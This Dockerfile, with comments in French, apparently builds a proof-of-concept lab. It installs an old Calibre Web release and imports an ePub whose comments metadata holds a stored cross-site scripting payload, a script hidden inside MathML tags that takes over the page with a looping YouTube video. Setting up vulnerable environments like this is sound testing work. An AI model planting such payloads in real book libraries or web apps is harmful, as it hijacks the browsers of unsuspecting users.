FROM python:3.10-slim

# Installation de base
RUN apt-get update && \
    apt-get install -y bash cargo wget calibre && \
    apt-get clean

# Installer Calibre Web dans un venv
RUN python3 -m venv calibre-web-env && \
    ./calibre-web-env/bin/python -m pip install --upgrade pip && \
    ./calibre-web-env/bin/python -m pip install calibreweb==0.6.12 && \
    ./calibre-web-env/bin/python -m pip install werkzeug==2.0.3

# Création des dossiers
RUN mkdir -p /library /books

# Récupérer un metadata.db d'exemple
RUN wget \
    https://github.com/janeczku/calibre-web/raw/master/library/metadata.db \
    -O /library/metadata.db

# Télécharger l'ePub
RUN wget \
    https://standardebooks.org/ebooks/honore-de-balzac/a-marriage-settlement/clara-bell/downloads/honore-de-balzac_a-marriage-settlement_clara-bell_advanced.epub \
    -O /books/honore-de-balzac_a-marriage-settlement_clara-bell_advanced.epub

# Modifier l'ePub directement, avant de l'importer
RUN ebook-meta /books/honore-de-balzac_a-marriage-settlement_clara-bell_advanced.epub \
    --comments "<math><mtext><script> document.body.innerHTML = '<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;z-index:9999;display:flex;align-items:center;justify-content:center;\"><iframe src=\"https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&amp;loop=1\" style=\"width:80%;height:80%;border:none;\"></iframe></div>'; </script></mtext></math>"

# Puis on ajoute ce livre "modifié" dans la bibliothèque
RUN calibredb add --with-library=/library \
    /books/honore-de-balzac_a-marriage-settlement_clara-bell_advanced.epub

EXPOSE 8083
CMD ["./calibre-web-env/bin/cps", "-f"]